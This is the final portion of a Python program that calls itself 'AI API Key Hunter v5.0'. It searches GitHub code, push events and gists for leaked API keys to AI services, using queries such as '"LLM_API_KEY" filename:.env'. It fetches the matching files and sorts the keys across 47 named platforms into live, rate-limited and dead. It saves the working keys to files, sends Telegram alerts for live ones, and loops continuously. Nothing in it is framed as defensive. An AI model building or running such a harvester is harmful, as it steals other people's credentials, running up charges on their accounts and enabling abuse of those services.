    'PIKA_API_KEY filename:.env',
    '"PIKA_LABS_API_KEY" filename:.env',
    # ── DeepAI ──
    'DEEPAI_API_KEY filename:.env',
    '"quickstart-" deepai language:python',
    # ── Generic catches ──
    '"AI_API_KEY" filename:.env',
    '"LLM_API_KEY" filename:.env',
    '"ai" "api_key" "secret" filename:.env',
]

def _run_search_query(query,query_num,total_queries):
    log.info(col(f"  [{query_num}/{total_queries}] {query}","blue"))
    total_results=0
    for page in range(1,SEARCH_PAGES+1):
        params={"q":query,"per_page":"30","sort":"indexed","order":"desc","page":str(page)}
        status,_,data=_github_get("/search/code",params)
        if not isinstance(data,dict):
            log.warning(col(f"    Page {page}: no data (HTTP {status})","yellow"))
            break
        items=data.get("items",[])
        total_results+=len(items)
        log.info(col(f"    Page {page}: {len(items)} result(s)","blue"))
        if not items: break
        for item in items:
            fname   =(item.get("name") or "")
            path    =(item.get("path") or "")
            rname   =(item.get("repository") or {}).get("full_name","")
            html_url=(item.get("html_url") or "")
            if _skip_fname(fname) or _skip_fname(path):
                log.debug(col(f"      [SKIP-FNAME] {rname}/{path}","dim"))
                continue
            if not _should_fetch_file(fname,path):
                log.debug(col(f"      [SKIP-TYPE] {rname}/{path}","dim"))
                continue
            if not html_url:
                log.debug(col(f"      [NO-URL] {rname}/{path}","dim"))
                continue
            raw_url=_html_url_to_raw(html_url)
            log.debug(col(f"      [FETCH] {rname}/{path}","dim"))
            content=_fetch_raw(raw_url)
            if content:
                _process(content,fname,html_url)
            else:
                log.debug(col(f"      [EMPTY] {rname}/{path}","dim"))
            time.sleep(0.3)
        time.sleep(1.2)
    log.info(col(f"    [DONE] {total_results} results — {query}","blue"))

def _scan_code_search():
    log.info(col("━━━ Phase 2: Code Search ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━","blue","bold"))
    total_q=len(_SEARCH_QUERIES)
    log.info(col(f"  Running all {total_q} queries this cycle...","blue"))
    for i,query in enumerate(_SEARCH_QUERIES,1):
        if _shutdown.is_set(): break
        _run_search_query(query,i,total_q)
    log.info(col(f"  Code Search done: all {total_q} queries complete.","blue"))

_shutdown=threading.Event()

def _countdown(seconds):
    for remaining in range(seconds,0,-1):
        if _shutdown.is_set(): return
        m,s=divmod(remaining,60)
        filled=20-(remaining*20//max(seconds,1))
        bar="\u2588"*filled+"\u2591"*(20-filled)
        print(f"\r  {col('Next cycle in:','dim')} {col(f'{m:02d}:{s:02d}','yellow')} [{bar}]",end="",flush=True)
        time.sleep(1)
    print()

_stats={"cycles":0,"start":time.time()}
_PLATFORMS=[
    "openai","anthropic","deepseek","groq","xai","perplexity","mistral","cohere",
    "together","gemini","huggingface","replicate","elevenlabs",
    "cerebras","openrouter","fireworks","novita","ai21","azure_openai",
    "fal","stability","bedrock","cloudflare","nvidia","voyage",
    "minimax","moonshot","qwen","runway","kling",
    "leonardo","luma","ideogram","pika","deepai",
    "coze","zhipu","bfl","jina","deepgram","assemblyai",
    "sambanova","hyperbolic","lepton","cartesia","pinecone","getimg",
]

def _print_stats():
    elapsed=int(time.time()-_stats["start"])
    h,rem=divmod(elapsed,3600); m,s=divmod(rem,60)
    with _results_lock:
        t       =len(_results)
        live_bp ={p:sum(1 for r in _results if r.get("status")=="live"        and r.get("platform")==p) for p in _PLATFORMS}
        rl_bp   ={p:sum(1 for r in _results if r.get("status")=="ratelimited" and r.get("platform")==p) for p in _PLATFORMS}
        l       =sum(live_bp.values())
        rl      =sum(rl_bp.values())
        dead_t  =sum(1 for r in _results if r.get("status")=="dead")
    print(col("─"*70,"dim"))
    print(col(f"  UPTIME {h:02d}:{m:02d}:{s:02d}  |  Cycles: {_stats['cycles']}  |  Total: {t}  |  Live: {l}  |  RateLimited: {rl}  |  Dead: {dead_t}","cyan","bold"))
    live_parts=[f"{p.upper()}: {live_bp[p]}" for p in _PLATFORMS if live_bp[p]>0]
    rl_parts  =[f"{p.upper()}: {rl_bp[p]}"  for p in _PLATFORMS if rl_bp[p]>0]
    if live_parts:
        print(col("  ✅ LIVE         "+"  ".join(live_parts),"green","bold"))
    else:
        print(col("  ✅ LIVE         (none yet)","dim"))
    if rl_parts:
        print(col("  ⚠️  RATE-LIMITED "+"  ".join(rl_parts),"yellow"))
    print(col("─"*70,"dim"))

def _banner():
    print(col(r"""
   █████╗ ██╗    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗
  ██╔══██╗██║    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
  ███████║██║    ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
  ██╔══██║██║    ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
  ██║  ██║██║    ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
  ╚═╝  ╚═╝╚═╝    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
""","cyan","bold"))
    print(col(f"  AI API Key Hunter v5.0  —  {len(_PLATFORMS)} Platforms  |  Rate-Limit Detection","yellow","bold"))
    print(col(f"  GitHub tokens : {len(GITHUB_TOKENS)}  |  Workers : {_workers()}","cyan"))
    print(col(f"  Platforms     : OpenAI  Anthropic  DeepSeek  Groq  xAI  Perplexity","cyan"))
    print(col(f"                  Mistral  Cohere  Together  Gemini  HuggingFace  Replicate  ElevenLabs","cyan"))
    print(col(f"                  Cerebras  OpenRouter  Fireworks  Novita  AI21  AzureOpenAI","cyan"))
    print(col(f"                  Fal  Stability  Bedrock  Cloudflare  NVIDIA  Voyage","cyan"))
    print(col(f"                  MiniMax  Moonshot(Kimi)  Qwen  Runway  Kling","cyan"))
    print(col(f"                  Leonardo  Luma  Ideogram  Pika  DeepAI","cyan"))
    print(col(f"  Search queries: {len(_SEARCH_QUERIES)} (all run every cycle, {SEARCH_PAGES} pages each)","cyan"))
    print(col(f"  Key states    : ✅ LIVE (working)  ⚠️ RATE-LIMITED (valid, no quota)  ✗ DEAD (invalid)","cyan"))
    print(col(f"  Output files  : ai_live_keys.txt  ai_ratelimited_keys.txt  ai_hunter_report.txt","dim"))
    print(col(f"  Cycle sleep   : {CYCLE_SLEEP}s  |  Entropy threshold : {ENTROPY_THRESHOLD}","dim"))
    if TELEGRAM_BOT_TOKEN: print(col("  Telegram      : Enabled ✓  (alerts for LIVE keys only)","green"))
    else:                  print(col("  Telegram      : Not configured","yellow"))
    print()

def _run_cycle(n):
    sep=col("="*70,"dim")
    print(f"\n{sep}")
    print(col(f"  Cycle #{n}  --  {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}","white","bold"))
    print(sep)
    t0=time.time()
    with ThreadPoolExecutor(max_workers=2) as p:
        futs={
            p.submit(_scan_push_events):"push",
            p.submit(_scan_gists)      :"gists",
        }
        for fut in as_completed(futs):
            name=futs[fut]
            try: fut.result()
            except Exception as exc:
                log.error(col(f"Phase '{name}' error: {exc}","red"))
    _scan_code_search()
    elapsed=time.time()-t0
    with _results_lock:
        l =sum(1 for r in _results if r.get("status")=="live")
        rl=sum(1 for r in _results if r.get("status")=="ratelimited")
        t =len(_results)
    print(col(f"\n  Cycle #{n} done in {elapsed:.1f}s  |  Live: {l}  Rate-Limited: {rl}  Total: {t}","green" if l else "white"))

def main():
    _banner()
    _load_seen()
    if not GITHUB_TOKENS or not GITHUB_TOKENS[0]:
        print(col("  WARNING: No GitHub tokens. Rate limit will be 60 req/h.","yellow"))
        print(col("  Set GITHUB_TOKEN_1 ... GITHUB_TOKEN_9 in .env\n","yellow"))
    cycle=1
    try:
        while not _shutdown.is_set():
            _run_cycle(cycle)
            _stats["cycles"]=cycle
            _print_stats()
            cycle+=1
            if not _shutdown.is_set():
                print(col(f"\n  Sleeping {CYCLE_SLEEP}s ...","dim"))
                _countdown(CYCLE_SLEEP)
    except KeyboardInterrupt:
        print(col("\n\n  Shutting down gracefully ...","yellow"))
        _shutdown.set()
        _flush_results()
        _print_stats()
        print(col(f"  Files: {LIVE_KEYS_FILE}  ai_ratelimited_keys.txt  {REPORT_FILE}  {RESULTS_JSON_FILE}  {SEEN_KEYS_FILE}  {LOG_FILE}","cyan"))
        print(col("  Bye.\n","dim"))

if __name__ == "__main__":
    import threading

    worker = threading.Thread(
        target=main,
        daemon=True
    )
    worker.start()

    port = int(os.environ.get("PORT", "10000"))

    app.run(
        host="0.0.0.0",
        port=port
    )
